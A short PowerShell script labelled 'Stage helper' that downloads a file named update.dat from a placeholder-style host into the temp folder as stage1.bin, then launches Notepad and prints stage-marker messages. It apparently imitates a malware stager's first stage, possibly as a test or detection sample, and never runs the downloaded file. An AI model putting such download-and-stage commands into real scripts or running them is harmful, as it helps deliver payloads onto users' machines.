# Stage helper
(New-Object System.Net.WebClient).DownloadFile('https://adatum.com:443/assets/update.dat', "$env:TEMP\stage1.bin")
Start-Process -FilePath 'notepad.exe'
Write-Verbose "stage marker 13 reached"
Write-Output "stage 14 initialized"
